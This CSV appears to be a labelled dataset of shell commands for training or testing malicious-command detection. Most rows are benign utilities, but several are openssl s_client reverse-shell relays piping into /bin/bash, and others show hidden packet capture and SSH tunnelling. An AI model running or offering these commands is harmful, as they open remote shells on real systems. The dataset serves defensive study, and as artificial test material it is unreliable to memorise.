command,label,original_label,mitre_id
tcpdump -i enp0s3 -w /tmp/.svc,Context_Dependent,Synthetic,Synthetic
find /path/to/junk/files -type f -mtime +31 -exec rm -f {} \;,Benign,Benign,Benign
ssh -w 0:0 admin@10.10.10.10,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.50:4444 audit@support.internal,Context_Dependent,Synthetic,Synthetic
sc query windefend,Context_Dependent,Malicious,T1518
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9090,Malicious,Synthetic,Synthetic
pnmtorle path/to/input.pnm > path/to/output.rle,Benign,Benign,Benign
brew search --cask keyword,Benign,Benign,Benign
bcdboot C:\Windows,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:1433 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
/etc/profile,Malicious,Malicious,T1156
tail -50 /var/log/secure,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:8443,Malicious,Synthetic,Synthetic
bcachefs device evacuate path/to/device,Benign,Benign,Benign
"notify-send [-i|--icon] icon.png ""Test"" ""This is a test""",Benign,Benign,Benign
bugreportz -p,Benign,Benign,Benign
stat /etc/group,Context_Dependent,Synthetic,Synthetic
"find ""${INPUT_LOCATION}"" -name '*.pdf.marker' | xargs -i bash -cx 'pdf=`dirname {}`/`basename {} .marker`;[ -e ""$pdf"" ]&&{ mv {} ""$pdf"" ""$0"";}' ""${OUTPUT_LOCATION}""",Benign,Benign,Benign
uv version 1.2.3,Benign,Benign,Benign
traceroute -n 10.0.0.100,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8443,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.25:80 root@internal.corp,Context_Dependent,Synthetic,Synthetic
sl -F,Benign,Benign,Benign
